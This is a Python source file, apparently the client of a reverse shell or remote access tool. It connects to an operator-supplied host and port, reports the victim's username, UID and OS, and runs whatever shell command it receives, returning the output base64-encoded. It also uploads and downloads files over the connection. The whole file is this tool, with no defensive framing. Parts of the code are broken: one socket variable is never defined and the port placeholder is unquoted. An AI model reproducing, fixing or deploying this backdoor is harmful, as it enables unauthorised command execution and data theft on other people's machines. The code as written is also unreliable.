import socket
import subprocess
import os
import pwd
import platform
import time
import base64

def inbound():
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return (message)
        except Exception:
            sock.close()

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf8'))
    sock.send(response)

def session_handler():
    try:
        print(f'[+] Connecting to {host_ip}.')
        sock.connect((host_ip, host_port))
        outbound(pwd.getpwuid(os.getuid())[0])
        outbound(os.getuid())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        print(f'[+] Connected to {host_ip}.')
        while True:
            message = inbound()
            print(f'[+] Message received - {message}')
            if message == 'exit':
                print('[-] The server has terminated the session.')
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to {cur_dir}')
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory. Try again.')
                    continue
            elif message == 'help':
                pass
            elif message == 'background':
                pass
            elif message[:7] == 'upload ':
                filename = message[7:]
                filename = os.path.basename(filename)
                upload_file(filename)
            elif message[:9] == 'download ':
                filename = message[9:]
                print(filename)
                try:
                    if os.path.exists(filename):
                        download_file(filename)
                    else:
                        response = '0'
                        response = bytes((response), encoding='utf8')
                        secure_sock.send(response)
                except FileNotFoundError:
                    pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass

def upload_file(file_name):
    try:
        f = open(file_name, 'wb')
        secure_sock.settimeout(2)
        chunk = secure_sock.recv(8192)
        while chunk:
            f.write(chunk)
            try:
                chunk = secure_sock.recv(8192)
            except socket.timeout as e:
                break
        secure_sock.settimeout(None)
        f.close()
    except Exception as e:
        print(e)


def download_file(file_name):
    try:
        f = open(file_name, 'rb')
        while True:
            try:
                bytes_read = f.read(8192)
                if not bytes_read:
                    break
                secure_sock.send(bytes_read)
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = 'INPUT_IP_HERE'
        host_port = INPUT_PORT_HERE
        session_handler()
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as e:
        print(e)